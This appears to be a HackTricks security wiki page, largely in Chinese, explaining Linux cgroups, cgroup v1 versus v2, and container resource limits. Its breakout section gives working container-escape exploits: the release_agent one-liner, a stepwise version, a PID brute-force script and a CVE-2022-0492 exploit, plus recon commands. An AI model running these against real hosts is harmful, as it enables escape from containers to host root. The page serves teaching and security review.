# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

Linux 的 **control groups** 是内核机制，用于将进程分组以进行计量、限制、优先级调度和策略执行。如果 namespaces 主要用于隔离对资源的可见性，cgroups 则主要用于管理一组进程可以消耗的资源量（**how much**），以及在某些情况下它们可以交互的资源类别（**which classes of resources**）。容器不断依赖 cgroups，即便用户从未直接查看它们，因为几乎每个现代 runtime 都需要一种方式告诉内核“这些进程属于这个工作负载，以下是适用于它们的资源规则”。

这就是 container engines 将新容器放入其自己的 cgroup 子树的原因。进程树一旦位于该位置，runtime 就可以限制内存、限制 PIDs 数量、为 CPU 使用设置权重、调节 I/O，并限制设备访问。在生产环境中，这对多租户安全和基本的运维卫生都至关重要。没有有效资源控制的容器可能耗尽内存、用进程淹没系统，或以使主机或相邻工作负载不稳定的方式独占 CPU 和 I/O。

从安全角度看，cgroups 在两个方面很重要。首先，不良或缺失的资源限制会导致直接的拒绝服务攻击。其次，一些 cgroup 特性，尤其是在较旧的 **cgroup v1** 配置中，当可以从容器内部写入时，历史上会产生强大的逃逸原语。

## v1 Vs v2

现实中存在两种主要的 cgroup 模型。**cgroup v1** 暴露多个控制器层次，早期的 exploit writeups 经常围绕那里一些奇怪且有时过于强大的语义展开。**cgroup v2** 引入了更统一的层次结构和更清晰的行为。现代发行版越来越偏好 cgroup v2，但混合或遗留环境仍然存在，这意味着在检查真实系统时两种模型仍然相关。

这一区别很重要，因为一些最著名的 container breakout 案例（例如在 cgroup v1 中对 **`release_agent`** 的滥用）非常具体地依赖于旧的 cgroup 行为。读者如果在博客上看到某个 cgroup exploit，然后盲目地将其应用到只使用 cgroup v2 的现代系统上，很可能误解目标系统上实际可行的内容。

## 检查

查看当前 shell 所在位置的最快方法是：
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` 文件显示与当前进程关联的 cgroup 路径。 在现代的 cgroup v2 主机上，通常会看到一个统一的条目。在较旧或混合主机上，可能会看到多个 v1 控制器路径。一旦知道路径，可检查 `/sys/fs/cgroup` 下的相应文件，以查看限制和当前使用情况。

在 cgroup v2 主机上，以下命令很有用：
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
这些文件显示了哪些控制器存在，以及哪些被委派给子 cgroups。这个委派模型在 rootless 和 systemd-managed 环境中很重要，因为运行时可能只能控制父层级实际委派的那部分 cgroup 功能。

## Lab

观察 cgroups 的一种方法是运行一个受内存限制的 container：
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
你也可以尝试一个受 PID 限制的容器：
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
These examples are useful because they help connect the runtime flag to the kernel file interface. The runtime is not enforcing the rule by magic; it is writing the relevant cgroup settings and then letting the kernel enforce them against the process tree.

## Runtime Usage

Docker、Podman、containerd 和 CRI-O 在正常运行中都依赖 cgroups。差异通常不是在于它们是否使用 cgroups，而是在于它们**选择哪些默认值**、**如何与 systemd 交互**、**rootless delegation 如何工作**，以及**有多少配置是在引擎级别控制而不是在编排级别控制**。

In Kubernetes, resource requests and limits eventually become cgroup configuration on the node. The path from Pod YAML to kernel enforcement passes through the kubelet, the CRI runtime, and the OCI runtime, but cgroups are still the kernel mechanism that finally applies the rule. In Incus/LXC environments, cgroups are also heavily used, especially because system containers often expose a richer process tree and more VM-like operational expectations.

## Misconfigurations And Breakouts

The classic cgroup security story is the writable **cgroup v1 `release_agent`** mechanism. In that model, if an attacker could write to the right cgroup files, enable `notify_on_release`, and control the path stored in `release_agent`, the kernel could end up executing an attacker-chosen path in the initial namespaces on the host when the cgroup became empty. That is why older writeups place so much attention on cgroup controller writability, mount options, and namespace/capability conditions.

Even when `release_agent` is not available, cgroup mistakes still matter. Overly broad device access can make host devices reachable from the container. Missing memory and PID limits can turn a simple code execution into a host DoS. Weak cgroup delegation in rootless scenarios can also mislead defenders into assuming a restriction exists when the runtime was never actually able to apply it.

### `release_agent` Background

The `release_agent` technique only applies to **cgroup v1**. The basic idea is that when the last process in a cgroup exits and `notify_on_release=1` is set, the kernel executes the program whose path is stored in `release_agent`. That execution happens in the **initial namespaces on the host**, which is what turns a writable `release_agent` into a container escape primitive.

For the technique to work, the attacker generally needs:

- a writable **cgroup v1** hierarchy
- the ability to create or use a child cgroup
- the ability to set `notify_on_release`
- the ability to write a path into `release_agent`
- a path that resolves to an executable from the host point of view

### Classic PoC

The historical one-liner PoC is:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
此 PoC 将一个 payload 路径写入 `release_agent`，触发 cgroup 释放，然后读取主机上生成的输出文件。

### 可读的分步讲解

将相同的思路分解为步骤会更容易理解。

1. 创建并准备一个可写的 cgroup:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. 确定与容器文件系统对应的主机路径：
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. 放置一个能从宿主路径看到的 payload：
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. 通过将 cgroup 清空来触发执行：
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
其效果是在 host 端以 root 权限执行 payload。在真实的 exploit 中，payload 通常会写入一个 proof file、启动一个 reverse shell，或修改 host 的状态。

### Relative Path Variant Using `/proc/<pid>/root`

在某些环境中，指向 container filesystem 的 host 路径并不明显，或者被 storage driver 隐藏。在这种情况下，payload 的路径可以通过 `/proc/<pid>/root/...` 来表示，其中 `<pid>` 是属于当前 container 的一个 host PID。这就是 relative-path brute-force variant 的基础：
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
The relevant trick here is not the brute force itself but the path form: `/proc/<pid>/root/...` lets the kernel resolve a file inside the container filesystem from the host namespace, even when the direct host storage path is not known ahead of time.

### CVE-2022-0492 变体

在 2022 年，CVE-2022-0492 表明在 cgroup v1 中写入 `release_agent` 时，并未正确检查 **初始** 用户命名空间中的 `CAP_SYS_ADMIN`。这使得该技术在易受攻击的内核上更易实现，因为能够挂载 cgroup 层次结构的容器进程可以在未在主机用户命名空间中具有特权的情况下写入 `release_agent`。

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
在易受攻击的内核上，主机会以主机 root 权限执行 `/proc/self/exe`。

在实际滥用中，首先检查环境是否仍然暴露可写的 cgroup-v1 路径或危险的设备访问：
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
如果 `release_agent` 存在且可写，你已经处于 legacy-breakout 领域：
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
如果 cgroup 路径本身无法导致逃逸，接下来常见的实际用途通常是 denial of service 或 reconnaissance：
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
这些命令可以快速判断该工作负载是否有空间进行 fork-bomb、激烈占用内存，或滥用可写的遗留 cgroup 接口。

## Checks

在审查目标时，cgroup 检查的目的是弄清正在使用哪种 cgroup 模型、容器是否能看到可写的控制器路径，以及像 `release_agent` 这样的旧型 breakout 原语是否仍然相关。
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
What is interesting here:

- If `mount | grep cgroup` shows **cgroup v1**, older breakout writeups become more relevant.
- If `release_agent` exists and is reachable, that is immediately worth deeper investigation.
- If the visible cgroup hierarchy is writable and the container also has strong capabilities, the environment deserves much closer review.

If you discover **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor protection, that combination deserves careful attention. cgroups are often treated as a boring resource-management topic, but historically they have been part of some of the most instructive container escape chains precisely because the boundary between "resource control" and "host influence" was not always as clean as people assumed.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default | Containers are placed in cgroups automatically; resource limits are optional unless set with flags | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Enabled by default | `--cgroups=enabled` is the default; cgroup namespace defaults vary by cgroup version (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, relaxed device access, `--privileged` |
| Kubernetes | Enabled through the runtime by default | Pods and containers are placed in cgroups by the node runtime; fine-grained resource control depends on `resources.requests` / `resources.limits` | omitting resource requests/limits, privileged device access, host-level runtime misconfiguration |
| containerd / CRI-O | Enabled by default | cgroups are part of normal lifecycle management | direct runtime configs that relax device controls or expose legacy writable cgroup v1 interfaces |

The important distinction is that **cgroup existence** is usually default, while **useful resource constraints** are often optional unless explicitly configured.
{{#include ../../../../banners/hacktricks-training.md}}
